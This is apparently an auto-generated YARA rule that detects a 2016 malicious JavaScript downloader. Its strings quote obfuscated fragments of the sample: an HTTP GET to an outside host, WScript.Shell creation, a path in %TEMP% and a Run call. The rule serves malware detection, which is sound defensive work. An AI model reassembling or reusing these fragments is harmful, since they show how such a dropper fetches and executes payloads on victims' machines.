rule sig_20160427_09cff5a92844dea8535b9b2db855bde9 {
  meta:
    description = "datamaliciousorder - file 20160427_09cff5a92844dea8535b9b2db855bde9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "26d640735b8f58329167887d8df307c42c433166921cdaf0626afdcb5b6f446f"

  strings:
    $s1  = "HjendMtuuy[ZllaiSjgyt](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function UlwqfTlwwh() {return BoafvBaijb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"MWn4hy1" ascii
    $s3  = "function UlwqfTlwwh() {return BoafvBaijb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"MWn4hy1" ascii
    $s4  = "var BoafvBaijb = function XcswmJdmxt() {return KynpuZyqxs[HctbnMotfv](\"WScript\"+\".Shell\");}(), JaqzzXbigd = 11;" fullword ascii
    $s5  = "function BjfqiVifko(FumouMpnqo, ZytlgKylrx){LfulzSvecd = LfulzSvecd * 1; return FumouMpnqo - ZytlgKylrx;};" fullword ascii
    $s6  = "var KynpuZyqxs = this[\"WScript\"];" fullword ascii
    $s7  = "function UcwjxPwrmk(){return QefcxAyrmt + \"\";};" fullword ascii
    $s8  = "if (HjendMtuuy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function FnmgsMkepl() {return ((RzfylEwici == true) && (RzfylEwici == SpnbdLokti)) ? 1 : LfulzSvecd;};" fullword ascii
    $s10 = "var YhngnPftvg = false;" fullword ascii
    $s11 = "function ZmioeFnczl(){return HctbnMotfv;};" fullword ascii
    $s12 = "return BjfqiVifko(SrqcwTpcga, BekvrPtzfc);" fullword ascii
    $s13 = "YhngnPftvg = true;" fullword ascii
    $s14 = "RzfylEwici = true; " fullword ascii
    $s15 = "var RzfylEwici = false;" fullword ascii
    $s16 = "function PocccWadze(){return 23;};" fullword ascii
    $s17 = "function XrgqxYvkdu(OqmmxFdqoi){BoafvBaijb[\"R\"+\"un\"](OqmmxFdqoi, LfulzSvecd, LfulzSvecd);};" fullword ascii
    $s18 = "var SpnbdLokti = false;" fullword ascii
    $s19 = "}while (TrberPekje);" fullword ascii
    $s20 = "SpnbdLokti = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}